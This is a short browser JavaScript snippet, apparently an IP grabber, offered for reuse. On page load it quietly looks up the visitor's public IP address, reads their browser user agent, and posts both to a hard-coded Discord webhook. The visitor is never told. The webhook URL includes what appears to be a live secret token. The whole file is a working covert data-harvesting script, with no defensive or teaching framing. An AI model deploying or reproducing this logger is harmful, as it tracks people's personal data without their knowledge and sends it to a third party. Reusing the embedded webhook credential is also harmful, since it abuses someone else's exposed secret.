// Replace this with your actual webhook URL
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1381352656907407430/iVllgtIG4bhE07zjzkox8yfCt8HARxuJi30nm2mLV-akkeEIWRYqq2fmPvR4gW_wk3sN";

// Get public IP from an API
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const userAgent = navigator.userAgent;

    // Send to Discord
    fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `🌐 New visitor logged!\nIP: \`${ip}\`\nUser Agent: \`${userAgent}\``
      })
    });
  })
  .catch(console.error);
